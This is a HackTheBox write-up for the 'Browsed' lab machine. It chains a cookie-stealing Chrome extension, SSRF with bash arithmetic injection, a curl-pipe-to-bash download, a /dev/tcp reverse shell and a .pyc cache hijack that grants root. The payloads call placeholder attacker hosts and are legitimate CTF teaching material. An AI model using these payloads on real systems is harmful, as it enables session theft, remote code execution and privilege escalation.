# Browsed — HackTheBox

| Field | Detail |
|---|---|
| OS | Linux |
| Difficulty | Medium |
| IP | 10.129.244.79 |
| User flag | checkmark |
| Root flag | checkmark |
| Site writeup | [jostif.pages.dev](https://jostif.pages.dev/writeups/browsed) |

**Techniques:** Malicious Chrome extension -> steal internal Gitea session -> SSRF via bot browser -> Bash arithmetic injection -> shell as larry -> Python .pyc hijack -> root

---

## Summary

Browsed centers around a web application that lets users upload Chrome extensions for "developer review" — a headless Chrome bot automatically opens them. Craft a malicious extension to steal the bot's internal Gitea session cookie, then leverage localhost access to exploit a bash arithmetic injection in a Flask app, landing a shell as larry. Root via Python `.pyc` cache hijack against a sudo-allowed script.

---

## 01 — Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.244.79 -oN nmap_full.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

---

## 02 — Enumeration

```bash
feroxbuster -u http://10.129.244.79 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,html,txt -t 100
# 200  upload.php
# 200  fontify.zip, timer.zip, replaceimages.zip  <- sample extensions
```

Upload any zip -> Chrome debug log leaks internal requests:

```
NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/
NetworkDelegate::NotifyBeforeURLRequest: http://localhost/
```

```bash
echo "10.129.244.79  browsedinternals.htb" | sudo tee -a /etc/hosts
```

Gitea (v1.24.5) at browsedinternals.htb. Public repo: `larry/MarkdownPreview`.

```bash
git clone http://browsedinternals.htb/larry/MarkdownPreview
# app.py  backups/  files/  log/  routines.sh
```

`app.py` — Flask on `127.0.0.1:5000` (localhost only):

```python
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

`routines.sh` — bash arithmetic injection:

```bash
if [[ "$1" -eq 0 ]]; then   # <-- unsanitized input in arithmetic context
    find "$TMP_DIR" ...
```

---

## 03 — Exploitation — Malicious Chrome Extension

**Step 1:** Craft extension that steals cookies and sends them to attacker.

`manifest.json`:
```json
{
  "manifest_version": 3,
  "name": "Cookie Stealer",
  "version": "1.0",
  "permissions": ["cookies", "http://browsedinternals.htb/*"],
  "background": { "service_worker": "background.js" }
}
```

`background.js`:
```javascript
chrome.cookies.getAll({domain: "browsedinternals.htb"}, function(cookies) {
  fetch("http://<ATTACKER>:8000/?c=" + JSON.stringify(cookies));
});
```

Zip, upload -> bot opens it -> Gitea session token captured.

**Step 2:** Second extension — trigger SSRF from bot's localhost context with arithmetic injection:

```javascript
fetch("http://127.0.0.1:5000/routines/0 a[$(curl http://<ATTACKER>:4444/shell.sh|bash)]");
```

`shell.sh`:
```bash
bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1
```

Upload -> bot triggers -> shell as `larry`.

---

## 04 — User Flag

```bash
cat /home/larry/user.txt
```

---

## 05 — PrivEsc — Python .pyc Hijack

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py

ls -la /opt/scripts/__pycache__/
# world-writable!
```

Compile malicious `.pyc` and replace the cached module:

```python
# evil.py
import os
os.system("chmod +s /bin/bash")
```

```bash
python3 -c "import py_compile; py_compile.compile('evil.py', '/opt/scripts/__pycache__/<module>.cpython-312.pyc')"
sudo /usr/bin/python3 /opt/scripts/backup.py
bash -p
# whoami: root
```

---

## Key takeaways

- Chrome extension uploads with automated bot review -> always test for cookie theft
- Chrome debug output leaks internal network topology (browsedinternals.htb)
- `[[ "$1" -eq 0 ]]` in bash is vulnerable to arithmetic injection with unsanitized input
- Flask on 127.0.0.1 is reachable via SSRF from a browser bot with localhost access
- World-writable `__pycache__` + sudo python script = .pyc hijack privesc
